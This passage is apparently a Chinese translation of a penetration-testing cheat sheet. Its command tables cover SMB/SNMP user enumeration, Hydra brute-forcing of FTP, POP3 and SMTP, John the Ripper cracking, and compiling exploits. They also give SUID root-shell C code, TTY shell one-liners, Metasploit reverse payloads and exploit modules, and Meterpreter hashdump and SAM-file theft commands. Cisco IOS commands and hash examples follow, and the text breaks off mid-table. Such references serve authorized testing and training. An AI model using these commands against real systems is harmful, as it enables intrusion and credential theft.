<h3 id="SMB-用户枚举"><a href="#SMB-用户枚举" class="headerlink" title="SMB 用户枚举"></a>SMB 用户枚举</h3><table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.XXX.XXX</code></td>
<td>枚举SMB用户</td>
</tr>
<tr>
<td><code>ridenum.py 192.168.XXX.XXX 500 50000 dict.txt</code></td>
<td>利用RID cycle枚举SMB用户</td>
</tr>
</tbody>
</table>
<h3 id="SNMP-用户枚举"><a href="#SNMP-用户枚举" class="headerlink" title="SNMP 用户枚举"></a>SNMP 用户枚举</h3><table>
<thead>
<tr>
<th>COMMAND</th>
<th>DESCRIPTION</th>
</tr>
</thead>
<tbody>
<tr>
<td>`snmpwalk public -v1 192.168.X.XXX 1</td>
<td>grep 77.1.2.25</td>
<td>cut -d” “ -f4`</td>
<td>枚举 SNMP 用户</td>
</tr>
<tr>
<td><code>python /usr/share/doc/python-impacket-doc/examples/samrdump.py SNMP 192.168.X.XXX</code></td>
<td>枚举 SNMP 用户</td>
</tr>
<tr>
<td><code>nmap -sT -p 161 192.168.X.XXX/254 -oG snmp_results.txt (then grep)</code></td>
<td>使用nmap搜索SNMP服务器，然后用grep过滤输出</td>
</tr>
</tbody>
</table>
<h2 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h2><h3 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h3><table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>/usr/share/wordlists</code></td>
<td>Kali 的字典存放路径</td>
</tr>
</tbody>
</table>
<h2 id="爆破服务"><a href="#爆破服务" class="headerlink" title="爆破服务"></a>爆破服务</h2><h3 id="使用Hydra-爆破FTP"><a href="#使用Hydra-爆破FTP" class="headerlink" title="使用Hydra 爆破FTP"></a>使用Hydra 爆破FTP</h3><table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX ftp -V</code></td>
<td>使用Hydra 爆破FTP</td>
</tr>
</tbody>
</table>
<h3 id="使用Hydra-爆破POP3"><a href="#使用Hydra-爆破POP3" class="headerlink" title="使用Hydra 爆破POP3"></a>使用Hydra 爆破POP3</h3><table>
<thead>
<tr>
<th>COMMAND</th>
<th>DESCRIPTION</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX pop3 -V</code></td>
<td>使用Hydra 爆破POP3</td>
</tr>
</tbody>
</table>
<h3 id="使用Hydra-爆破SMTP"><a href="#使用Hydra-爆破SMTP" class="headerlink" title="使用Hydra 爆破SMTP"></a>使用Hydra 爆破SMTP</h3><table>
<thead>
<tr>
<th>COMMAND</th>
<th>DESCRIPTION</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V</code></td>
<td>使用Hydra 爆破SMTP</td>
</tr>
</tbody>
</table>
<p>使用 <code>-t</code> 限制并发连接数，如 <code>-t 15</code></p>
<h2 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h2><p>渗透测试中用于密码破解的工具。</p>
<h3 id="John-The-Ripper-JTR"><a href="#John-The-Ripper-JTR" class="headerlink" title="John The Ripper - JTR"></a>John The Ripper - JTR</h3><table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>john --wordlist=/usr/share/wordlists/rockyou.txt hashes</code></td>
<td>JTR 破解密码</td>
</tr>
<tr>
<td><code>john --format=descrypt --wordlist  /usr/share/wordlists/rockyou.txt hash.txt</code></td>
<td>JTR 使用字典爆破解密</td>
</tr>
<tr>
<td><code>john --format=descrypt hash --show</code></td>
<td>JTR 爆破解密</td>
</tr>
</tbody>
</table>
<h2 id="Windows-渗透测试命令"><a href="#Windows-渗透测试命令" class="headerlink" title="Windows 渗透测试命令"></a>Windows 渗透测试命令</h2><p>See <strong>Windows Penetration Testing Commands</strong>.【待原文补充】</p>
<h2 id="Linux-渗透测试命令"><a href="#Linux-渗透测试命令" class="headerlink" title="Linux 渗透测试命令"></a>Linux 渗透测试命令</h2><p>参考本站的<a href="https://highon.coffee/blog/linux-commands-cheat-sheet/" target="_blank" rel="noopener">Linux 命令速查表</a> ，该表提供了很多有用的命令。</p>
<h2 id="编译EXP"><a href="#编译EXP" class="headerlink" title="编译EXP"></a>编译EXP</h2><p>Some notes on compiling exploits.【待原文补充】</p>
<h3 id="判断C代码适用于Windows平台还是Linux"><a href="#判断C代码适用于Windows平台还是Linux" class="headerlink" title="判断C代码适用于Windows平台还是Linux"></a>判断C代码适用于Windows平台还是Linux</h3><p>通过<code>#include</code> 的文件来判定 </p>
<table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>process.h, string.h, winbase.h, windows.h, winsock2.h</code></td>
<td>Windows平台代码</td>
</tr>
<tr>
<td><code>arpa/inet.h, fcntl.h, netdb.h, netinet/in.h,  sys/sockt.h, sys/types.h, unistd.h</code></td>
<td>Linux平台代码</td>
</tr>
</tbody>
</table>
<h3 id="使用GCC编译Exploit"><a href="#使用GCC编译Exploit" class="headerlink" title="使用GCC编译Exploit"></a>使用GCC编译Exploit</h3><table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>gcc -o exploit exploit.c</code></td>
<td>GCC基本用法</td>
</tr>
</tbody>
</table>
<h3 id="在64位的Kali上用GCC编译32位的EXP"><a href="#在64位的Kali上用GCC编译32位的EXP" class="headerlink" title="在64位的Kali上用GCC编译32位的EXP"></a>在64位的Kali上用GCC编译32位的EXP</h3><p>很方便地在64位的攻击机器上交叉编译32位的二进制文件。</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>gcc -m32 exploit.c -o exploit</code></td>
<td>在64位的Linux上交叉编译32位的二进制文件</td>
</tr>
</tbody>
</table>
<h3 id="在-Linux上编译可运行于Windows的exe文件"><a href="#在-Linux上编译可运行于Windows的exe文件" class="headerlink" title="在 Linux上编译可运行于Windows的exe文件"></a>在 Linux上编译可运行于Windows的exe文件</h3><table>
<thead>
<tr>
<th>COMMAND</th>
<th>DESCRIPTION</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe</code></td>
<td>在 Linux上生成Windows的exe</td>
</tr>
</tbody>
</table>
<h2 id="SUID-二进制"><a href="#SUID-二进制" class="headerlink" title="SUID 二进制"></a>SUID 二进制</h2><p>通常具有SUID的 C二进制文件要求以超级用户登陆shell，您可以按需更新UID / GID和shell。</p>
<p>下面是一些可用的shell：</p>
<h3 id="运行-bin-bash的SUID-C-Shell"><a href="#运行-bin-bash的SUID-C-Shell" class="headerlink" title="运行 /bin/bash的SUID C Shell"></a>运行 /bin/bash的SUID C Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int main(void)&#123;</span><br><span class="line">       setresuid(0, 0, 0);</span><br><span class="line">       system(&quot;/bin/bash&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="运行-bin-sh的SUID-C-Shell"><a href="#运行-bin-sh的SUID-C-Shell" class="headerlink" title="运行 /bin/sh的SUID C Shell"></a>运行 /bin/sh的SUID C Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int main(void)&#123;</span><br><span class="line">       setresuid(0, 0, 0);</span><br><span class="line">       system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="构建-SUID-Shell-二进制"><a href="#构建-SUID-Shell-二进制" class="headerlink" title="构建 SUID Shell 二进制"></a>构建 SUID Shell 二进制</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o suid suid.c</span><br></pre></td></tr></table></figure>
<p>32位</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -o suid suid.c</span><br></pre></td></tr></table></figure>
<h2 id="反向Shells"><a href="#反向Shells" class="headerlink" title="反向Shells"></a>反向Shells</h2><p>参考 <a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/" target="_blank" rel="noopener">反向 Shell 速查表</a> 。</p>
<h2 id="TTY-Shells"><a href="#TTY-Shells" class="headerlink" title="TTY Shells"></a>TTY Shells</h2><p>Tips / Tricks to spawn a TTY shell from a limited shell in Linux, useful for running commands like <code>su</code> from reverse shells.</p>
<p>一些模拟出TTY终端窗口以突破shell限制的技巧，便于从反向shell上执行类似 <code>su</code> 的特殊命令。</p>
<h3 id="用Python模拟-TTY-Shell的技巧"><a href="#用Python模拟-TTY-Shell的技巧" class="headerlink" title="用Python模拟 TTY Shell的技巧"></a>用Python模拟 TTY Shell的技巧</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo os.system(&apos;/bin/bash&apos;)</span><br></pre></td></tr></table></figure>
<h3 id="用sh模拟交互式shell"><a href="#用sh模拟交互式shell" class="headerlink" title="用sh模拟交互式shell"></a>用sh模拟交互式shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh -i</span><br></pre></td></tr></table></figure>
<h3 id="用Perl模拟-TTY-Shell"><a href="#用Perl模拟-TTY-Shell" class="headerlink" title="用Perl模拟 TTY Shell"></a>用Perl模拟 TTY Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec &quot;/bin/sh&quot;;</span><br><span class="line">perl —e &apos;exec &quot;/bin/sh&quot;;&apos;</span><br></pre></td></tr></table></figure>
<h3 id="用Ruby模拟-TTY-Shell"><a href="#用Ruby模拟-TTY-Shell" class="headerlink" title="用Ruby模拟 TTY Shell"></a>用Ruby模拟 TTY Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure>
<h3 id="用Lua-模拟TTY-Shell"><a href="#用Lua-模拟TTY-Shell" class="headerlink" title="用Lua 模拟TTY Shell"></a>用Lua 模拟TTY Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.execute(&apos;/bin/sh&apos;)</span><br></pre></td></tr></table></figure>
<h3 id="从Vi模拟TTY-Shell"><a href="#从Vi模拟TTY-Shell" class="headerlink" title="从Vi模拟TTY Shell"></a>从Vi模拟TTY Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:!bash</span><br></pre></td></tr></table></figure>
<h3 id="用NMAP模拟TTY-Shell"><a href="#用NMAP模拟TTY-Shell" class="headerlink" title="用NMAP模拟TTY Shell"></a>用NMAP模拟TTY Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!sh</span><br></pre></td></tr></table></figure>
<h2 id="Metasploit-速查表"><a href="#Metasploit-速查表" class="headerlink" title="Metasploit 速查表"></a>Metasploit 速查表</h2><p>这是一个metasploit方便的速查手册。关于跳板技术可参看 <a href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/" target="_blank" rel="noopener">Meterpreter Pivoting</a> 。</p>
<h3 id="Meterpreter-Payloads"><a href="#Meterpreter-Payloads" class="headerlink" title="Meterpreter Payloads"></a>Meterpreter Payloads</h3><h3 id="Windows-反向meterpreter-payload"><a href="#Windows-反向meterpreter-payload" class="headerlink" title="Windows 反向meterpreter payload"></a>Windows 反向meterpreter payload</h3><table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>set payload windows/meterpreter/reverse_tcp</code></td>
<td>Windows 反向tcp payload</td>
</tr>
</tbody>
</table>
<h3 id="Windows-VNC-Meterpreter-payload"><a href="#Windows-VNC-Meterpreter-payload" class="headerlink" title="Windows VNC Meterpreter payload"></a>Windows VNC Meterpreter payload</h3><table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>set payload windows/vncinject/reverse_tcp`</code>set ViewOnly false`</td>
<td>Meterpreter Windows VNC Payload</td>
</tr>
</tbody>
</table>
<h3 id="Linux-反向Meterpreter-payload"><a href="#Linux-反向Meterpreter-payload" class="headerlink" title="Linux 反向Meterpreter payload"></a>Linux 反向Meterpreter payload</h3><table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>set payload linux/meterpreter/reverse_tcp</code></td>
<td>Meterpreter Linux 反向Payload</td>
</tr>
</tbody>
</table>
<h2 id="Meterpreter速查表"><a href="#Meterpreter速查表" class="headerlink" title="Meterpreter速查表"></a>Meterpreter速查表</h2><p>有用的meterpreter 命令。</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>upload file c:\\windows</code></td>
<td>Meterpreter上传文件到 Windows 目标</td>
</tr>
<tr>
<td><code>download c:\\windows\\repair\\sam /tmp</code></td>
<td>Meterpreter 从 Windows 目标下载文件</td>
</tr>
<tr>
<td><code>execute -f c:\\windows\temp\exploit.exe</code></td>
<td>Meterpreter 在目标机器上执行.exe文件——用来执行上传的exp很方便</td>
</tr>
<tr>
<td><code>execute -f cmd -c</code></td>
<td>创建新的cmd shell通道</td>
</tr>
<tr>
<td><code>ps</code></td>
<td>Meterpreter显示进程</td>
</tr>
<tr>
<td><code>shell</code></td>
<td>Meterpreter获取目标shell</td>
</tr>
<tr>
<td><code>getsystem</code></td>
<td>Meterpreter尝试提权</td>
</tr>
<tr>
<td><code>hashdump</code></td>
<td>Meterpreter尝试导出目标机器上的哈希</td>
</tr>
<tr>
<td><code>portfwd add –l 3389 –p 3389 –r target</code></td>
<td>Meterpreter端口转发</td>
</tr>
<tr>
<td><code>portfwd delete –l 3389 –p 3389 –r target</code></td>
<td>Meterpreter删除端口转发</td>
</tr>
</tbody>
</table>
<h2 id="常用Metasploit-模块"><a href="#常用Metasploit-模块" class="headerlink" title="常用Metasploit 模块"></a>常用Metasploit 模块</h2><p>最常用的metasploit 模块。</p>
<h3 id="远程Windows-Metasploit-模块-exploits"><a href="#远程Windows-Metasploit-模块-exploits" class="headerlink" title="远程Windows Metasploit 模块(exploits)"></a>远程Windows Metasploit 模块(exploits)</h3><table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>use exploit/windows/smb/ms08_067_netapi</code></td>
<td>MS08_067 Windows 2k, XP, 2003 远程攻击</td>
</tr>
<tr>
<td><code>use exploit/windows/dcerpc/ms06_040_netapi</code></td>
<td>MS08_040 Windows NT, 2k, XP, 2003 远程攻击</td>
</tr>
<tr>
<td><code>use exploit/windows/smb/ms09_050_smb2_negotiate_func_index</code></td>
<td>MS09_050 Windows Vista SP1/SP2 和Server 2008 (x86) 远程攻击</td>
</tr>
</tbody>
</table>
<h3 id="本地Windows-Metasploit-模块-exploits"><a href="#本地Windows-Metasploit-模块-exploits" class="headerlink" title="本地Windows Metasploit 模块(exploits)"></a>本地Windows Metasploit 模块(exploits)</h3><table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>use exploit/windows/local/bypassuac</code></td>
<td>绕过 Windows 7 上的UAC</td>
</tr>
</tbody>
</table>
<h3 id="辅助Metasploit-模块"><a href="#辅助Metasploit-模块" class="headerlink" title="辅助Metasploit 模块"></a>辅助Metasploit 模块</h3><table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>use auxiliary/scanner/http/dir_scanner</code></td>
<td>Metasploit HTTP 目录扫描</td>
</tr>
<tr>
<td><code>use auxiliary/scanner/http/jboss_vulnscan</code></td>
<td>Metasploit JBOSS 漏扫</td>
</tr>
<tr>
<td><code>use auxiliary/scanner/mssql/mssql_login</code></td>
<td>Metasploit MSSQL 认证扫描</td>
</tr>
<tr>
<td><code>use auxiliary/scanner/mysql/mysql_version</code></td>
<td>Metasploit MSSQL 版本扫描</td>
</tr>
<tr>
<td><code>use auxiliary/scanner/oracle/oracle_login</code></td>
<td>Metasploit Oracle 登陆模块</td>
</tr>
</tbody>
</table>
<h3 id="Metasploit-Powershell-模块"><a href="#Metasploit-Powershell-模块" class="headerlink" title="Metasploit Powershell 模块"></a>Metasploit Powershell 模块</h3><table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>use exploit/multi/script/web_delivery</code></td>
<td>Metasploit powershell payload c传送模块</td>
</tr>
<tr>
<td><code>post/windows/manage/powershell/exec_powershell</code></td>
<td>Metasploit通过会话上传和执行 powershell脚本</td>
</tr>
<tr>
<td><code>use exploit/multi/http/jboss_maindeployer</code></td>
<td>Metasploit JBOSS 部署</td>
</tr>
<tr>
<td><code>use exploit/windows/mssql/mssql_payload</code></td>
<td>Metasploit MSSQL payload</td>
</tr>
</tbody>
</table>
<h3 id="Windows-后渗透Metasploit-模块"><a href="#Windows-后渗透Metasploit-模块" class="headerlink" title="Windows 后渗透Metasploit 模块"></a>Windows 后渗透Metasploit 模块</h3><p>Windows Metasploit 提权模块。</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>run post/windows/gather/win_privs</code></td>
<td>Metasploit 显示当前用户权限</td>
</tr>
<tr>
<td><code>use post/windows/gather/credentials/gpp</code></td>
<td>Metasploit 提取 GPP 保存的密码</td>
</tr>
<tr>
<td><code>load mimikatz -&gt; wdigest</code></td>
<td>Metasplit 加载 Mimikatz</td>
</tr>
<tr>
<td><code>run post/windows/gather/local_admin_search_enum</code></td>
<td>检查当前用户是否对域内其他机器有管理员权限</td>
</tr>
<tr>
<td><code>run post/windows/gather/smart_hashdump</code></td>
<td>自动化导出sam 文件，尝试提权等。</td>
</tr>
</tbody>
</table>
<h2 id="ASCII表速查"><a href="#ASCII表速查" class="headerlink" title="ASCII表速查"></a>ASCII表速查</h2><p>对Web应用渗透测试很有用，或者你被困在火星而需要和NASA通信。（梗自《火星救援》）</p>
<table>
<thead>
<tr>
<th>ASCII</th>
<th>字符</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>x00</code></td>
<td>Null Byte 空字节</td>
</tr>
<tr>
<td><code>x08</code></td>
<td>BS  退格</td>
</tr>
<tr>
<td><code>x09</code></td>
<td>TAB 水平制表符</td>
</tr>
<tr>
<td><code>x0a</code></td>
<td>LF 换行</td>
</tr>
<tr>
<td><code>x0d</code></td>
<td>CR 回车</td>
</tr>
<tr>
<td><code>x1b</code></td>
<td>ESC</td>
</tr>
<tr>
<td><code>x20</code></td>
<td>SPC 空格</td>
</tr>
<tr>
<td><code>x21</code></td>
<td>!</td>
</tr>
<tr>
<td><code>x22</code></td>
<td>“</td>
</tr>
<tr>
<td><code>x23</code></td>
<td>#</td>
</tr>
<tr>
<td><code>x24</code></td>
<td>$</td>
</tr>
<tr>
<td><code>x25</code></td>
<td>%</td>
</tr>
<tr>
<td><code>x26</code></td>
<td>&amp;</td>
</tr>
<tr>
<td><code>x27</code></td>
<td>`</td>
</tr>
<tr>
<td><code>x28</code></td>
<td>(</td>
</tr>
<tr>
<td><code>x29</code></td>
<td>)</td>
</tr>
<tr>
<td><code>x2a</code></td>
<td>*</td>
</tr>
<tr>
<td><code>x2b</code></td>
<td>+</td>
</tr>
<tr>
<td><code>x2c</code></td>
<td>,</td>
</tr>
<tr>
<td><code>x2d</code></td>
<td>-</td>
</tr>
<tr>
<td><code>x2e</code></td>
<td>.</td>
</tr>
<tr>
<td><code>x2f</code></td>
<td>/</td>
</tr>
<tr>
<td><code>x30</code></td>
<td>0</td>
</tr>
<tr>
<td><code>x31</code></td>
<td>1</td>
</tr>
<tr>
<td><code>x32</code></td>
<td>2</td>
</tr>
<tr>
<td><code>x33</code></td>
<td>3</td>
</tr>
<tr>
<td><code>x34</code></td>
<td>4</td>
</tr>
<tr>
<td><code>x35</code></td>
<td>5</td>
</tr>
<tr>
<td><code>x36</code></td>
<td>6</td>
</tr>
<tr>
<td><code>x37</code></td>
<td>7</td>
</tr>
<tr>
<td><code>x38</code></td>
<td>8</td>
</tr>
<tr>
<td><code>x39</code></td>
<td>9</td>
</tr>
<tr>
<td><code>x3a</code></td>
<td>:</td>
</tr>
<tr>
<td><code>x3b</code></td>
<td>;</td>
</tr>
<tr>
<td><code>x3c</code></td>
<td>&lt;</td>
</tr>
<tr>
<td><code>x3d</code></td>
<td>=</td>
</tr>
<tr>
<td><code>x3e</code></td>
<td>&gt;</td>
</tr>
<tr>
<td><code>x3f</code></td>
<td>?</td>
</tr>
<tr>
<td><code>x40</code></td>
<td>@</td>
</tr>
<tr>
<td><code>x41</code></td>
<td>A</td>
</tr>
<tr>
<td><code>x42</code></td>
<td>B</td>
</tr>
<tr>
<td><code>x43</code></td>
<td>C</td>
</tr>
<tr>
<td><code>x44</code></td>
<td>D</td>
</tr>
<tr>
<td><code>x45</code></td>
<td>E</td>
</tr>
<tr>
<td><code>x46</code></td>
<td>F</td>
</tr>
<tr>
<td><code>x47</code></td>
<td>G</td>
</tr>
<tr>
<td><code>x48</code></td>
<td>H</td>
</tr>
<tr>
<td><code>x49</code></td>
<td>I</td>
</tr>
<tr>
<td><code>x4a</code></td>
<td>J</td>
</tr>
<tr>
<td><code>x4b</code></td>
<td>K</td>
</tr>
<tr>
<td><code>x4c</code></td>
<td>L</td>
</tr>
<tr>
<td><code>x4d</code></td>
<td>M</td>
</tr>
<tr>
<td><code>x4e</code></td>
<td>N</td>
</tr>
<tr>
<td><code>x4f</code></td>
<td>O</td>
</tr>
<tr>
<td><code>x50</code></td>
<td>P</td>
</tr>
<tr>
<td><code>x51</code></td>
<td>Q</td>
</tr>
<tr>
<td><code>x52</code></td>
<td>R</td>
</tr>
<tr>
<td><code>x53</code></td>
<td>S</td>
</tr>
<tr>
<td><code>x54</code></td>
<td>T</td>
</tr>
<tr>
<td><code>x55</code></td>
<td>U</td>
</tr>
<tr>
<td><code>x56</code></td>
<td>V</td>
</tr>
<tr>
<td><code>x57</code></td>
<td>W</td>
</tr>
<tr>
<td><code>x58</code></td>
<td>X</td>
</tr>
<tr>
<td><code>x59</code></td>
<td>Y</td>
</tr>
<tr>
<td><code>x5a</code></td>
<td>Z</td>
</tr>
<tr>
<td><code>x5b</code></td>
<td>[</td>
</tr>
<tr>
<td><code>x5c</code></td>
<td>\</td>
</tr>
<tr>
<td><code>x5d</code></td>
<td>]</td>
</tr>
<tr>
<td><code>x5e</code></td>
<td>^</td>
</tr>
<tr>
<td><code>x5f</code></td>
<td>_</td>
</tr>
<tr>
<td><code>x60</code></td>
<td>`</td>
</tr>
<tr>
<td><code>x61</code></td>
<td>a</td>
</tr>
<tr>
<td><code>x62</code></td>
<td>b</td>
</tr>
<tr>
<td><code>x63</code></td>
<td>c</td>
</tr>
<tr>
<td><code>x64</code></td>
<td>d</td>
</tr>
<tr>
<td><code>x65</code></td>
<td>e</td>
</tr>
<tr>
<td><code>x66</code></td>
<td>f</td>
</tr>
<tr>
<td><code>x67</code></td>
<td>g</td>
</tr>
<tr>
<td><code>x68</code></td>
<td>h</td>
</tr>
<tr>
<td><code>x69</code></td>
<td>i</td>
</tr>
<tr>
<td><code>x6a</code></td>
<td>j</td>
</tr>
<tr>
<td><code>x6b</code></td>
<td>k</td>
</tr>
<tr>
<td><code>x6c</code></td>
<td>l</td>
</tr>
<tr>
<td><code>x6d</code></td>
<td>m</td>
</tr>
<tr>
<td><code>x6e</code></td>
<td>n</td>
</tr>
<tr>
<td><code>x6f</code></td>
<td>o</td>
</tr>
<tr>
<td><code>x70</code></td>
<td>p</td>
</tr>
<tr>
<td><code>x71</code></td>
<td>q</td>
</tr>
<tr>
<td><code>x72</code></td>
<td>r</td>
</tr>
<tr>
<td><code>x73</code></td>
<td>s</td>
</tr>
<tr>
<td><code>x74</code></td>
<td>t</td>
</tr>
<tr>
<td><code>x75</code></td>
<td>u</td>
</tr>
<tr>
<td><code>x76</code></td>
<td>v</td>
</tr>
<tr>
<td><code>x77</code></td>
<td>w</td>
</tr>
<tr>
<td><code>x78</code></td>
<td>x</td>
</tr>
<tr>
<td><code>x79</code></td>
<td>y</td>
</tr>
<tr>
<td><code>x7a</code></td>
<td>z</td>
</tr>
</tbody>
</table>
<h2 id="CISCO-IOS-网际操作系统-命令"><a href="#CISCO-IOS-网际操作系统-命令" class="headerlink" title="CISCO IOS(网际操作系统) 命令"></a>CISCO IOS(网际操作系统) 命令</h2><p>收集一些有用的Cisco IOS 命令.</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>enable</code></td>
<td>进入使能模式</td>
</tr>
<tr>
<td><code>conf t</code></td>
<td>配置终端</td>
</tr>
<tr>
<td><code>(config)# interface fa0/0</code></td>
<td>配置 FastEthernet 0/0</td>
</tr>
<tr>
<td><code>(config-if)# ip addr 0.0.0.0 255.255.255.255</code></td>
<td>添加IP到 fa0/0</td>
</tr>
<tr>
<td><code>(config-if)# line vty 0 4</code></td>
<td>配置 vty line</td>
</tr>
<tr>
<td><code>(config-line)# login</code></td>
<td>登陆</td>
</tr>
<tr>
<td><code>(config-line)# password YOUR-PASSWORD</code></td>
<td>设置 telnet 密码</td>
</tr>
<tr>
<td><code># show running-config</code></td>
<td>显示内存中的运行配置</td>
</tr>
<tr>
<td><code># show startup-config</code></td>
<td>显示启动配置</td>
</tr>
<tr>
<td><code># show version</code></td>
<td>显示cisco IOS 版本</td>
</tr>
<tr>
<td><code># show session</code></td>
<td>显示已打开的会话</td>
</tr>
<tr>
<td><code># show ip interface</code></td>
<td>显示网卡</td>
</tr>
<tr>
<td><code># show interface e0</code></td>
<td>显示网络接口细节</td>
</tr>
<tr>
<td><code># show ip route</code></td>
<td>显示路由</td>
</tr>
<tr>
<td><code># show access-lists</code></td>
<td>显示access lists</td>
</tr>
<tr>
<td><code># dir file systems</code></td>
<td>列出可用文件</td>
</tr>
<tr>
<td><code># dir all-filesystems</code></td>
<td>显示文件信息</td>
</tr>
<tr>
<td><code># dir /all</code></td>
<td>显示已删除文件</td>
</tr>
<tr>
<td><code># terminal length 0</code></td>
<td>取消终端输出长度限制</td>
</tr>
<tr>
<td><code># copy running-config tftp</code></td>
<td>复制运行配置到tftp 服务器</td>
</tr>
<tr>
<td><code># copy running-config startup-config</code></td>
<td>复制启动配置到运行配置</td>
</tr>
</tbody>
</table>
<h2 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h2><h3 id="哈希长度"><a href="#哈希长度" class="headerlink" title="哈希长度"></a>哈希长度</h3><table>
<thead>
<tr>
<th>哈希</th>
<th>长度</th>
</tr>
</thead>
<tbody>
<tr>
<td>MD5</td>
<td><code>16 Bytes</code></td>
</tr>
<tr>
<td>SHA-1</td>
<td><code>20 Bytes</code></td>
</tr>
<tr>
<td>SHA-256</td>
<td><code>32 Bytes</code></td>
</tr>
<tr>
<td>SHA-512</td>
<td><code>64 Bytes</code></td>
</tr>
</tbody>
</table>
<h3 id="哈希例子"><a href="#哈希例子" class="headerlink" title="哈希例子"></a>哈希例子</h3><p>可以直接使用  <strong>hash-identifier</strong>  命令判断哈希类型，但这里还是举些例子。</p>
<table>
<thead>
<tr>
<th>哈希</th>
<th>例子</th>
</tr>
</thead>
<tbody>
<tr>
<td>MD5 Hash Example</td>
<td><code>8743b52063cd84097a65d1633f5c74f5</code></td>
</tr>
<tr>
<td>MD5 $PASS:$SALT Example</td>
<td><code>01dfae6e5d4d90d9892622325959afbe:7050461</code></td>
</tr>
<tr>
<td>MD5 $SALT:$PASS</td>
<td><code>f0fda58630310a6dd91a7d8f0a4ceda2:4225637426</code></td>
</tr>
<tr>
<td>SHA1 Hash Example</td>
<td><code>b89eaac7e61417341b710b727768294d0e6a277b</code></td>
</tr>
<tr>
<td>SHA1 $PASS:$SALT</td>
<td><code>2fc5a684737ce1bf7b3b239df432416e0dd07357:2014</code></td>
</tr>
<tr>
<td>SHA1 $SALT:$PASS</td>
<td><code>cac35ec206d868b7d7cb0b55f31d9425b075082b:5363620024</code></td>
</tr>
<tr>
<td>SHA-256</td>
<td><code>127e6fbfe24a750e72930c220a8e138275656b8e5d8f48a98c3c92df2caba935</code></td>
</tr>
<tr>
<td>SHA-256 $PASS:$SALT</td>
<td><code>c73d08de890479518ed60cf670d17faa26a4a71f995c1dcc978165399401a6c4</code></td>
</tr>
<tr>
<td>SHA-256 $SALT:$PASS</td>
